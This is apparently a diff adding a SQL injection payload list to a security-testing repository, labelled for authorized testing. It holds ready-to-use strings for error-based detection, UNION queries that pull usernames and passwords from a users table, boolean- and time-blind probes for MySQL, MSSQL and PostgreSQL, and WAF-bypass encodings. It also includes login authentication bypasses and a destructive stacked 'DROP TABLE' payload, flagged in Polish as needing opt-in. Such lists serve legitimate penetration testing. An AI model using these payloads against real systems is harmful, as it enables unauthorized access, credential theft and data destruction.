@@ -1,0 +1,61 @@
+# SQL Injection — canonical payloads (authorized testing)
+# Full sets: ../vendor/PayloadsAllTheThings/SQL Injection/  | automation: sqlmap
+# Test in: query params, body, headers (User-Agent, X-Forwarded-For), cookie, JSON
+
+## --- Detection (error/boolean) ---
+'
+"
+`
+')
+")
+';--
+'--
+' OR '1'='1
+' OR '1'='1'--
+" OR "1"="1
+" OR 1=1--
+' OR 1=1#
+admin'--
+admin' #
+admin'/*
+' OR 1=1 LIMIT 1--
+1' ORDER BY 1--
+1' ORDER BY 10--
+
+## --- UNION-based (match the number of columns) ---
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+-1 UNION SELECT 1,version(),database()--
+-1' UNION SELECT 1,@@version,3--
+
+## --- Boolean-blind ---
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(version(),1,1)='5'--
+' AND (SELECT COUNT(*) FROM users)>0--
+
+## --- Time-blind ---
+' AND SLEEP(5)--                         # MySQL
+'; WAITFOR DELAY '0:0:5'--               # MSSQL
+' AND pg_sleep(5)--                       # PostgreSQL
+' || (SELECT 1 FROM PG_SLEEP(5))--
+' AND 1=(SELECT 1 FROM dual WHERE 1=1 AND SLEEP(5))--
+
+## --- Stacked ---
+'; DROP TABLE test;--                     # UWAGA destrukcyjne — tylko z opt-in
+'; INSERT INTO ...--
+
+## --- WAF bypass (variants) ---
+'/**/OR/**/1=1--
+'%20OR%201=1--
+'+OR+1=1--
+' Or 1=1-- -
+'/*!50000OR*/1=1--
+0x27206f7220313d31
+
+## --- Auth bypass in the login ---
+admin' OR '1'='1'-- -
+' OR ''='
+') OR ('1'='1
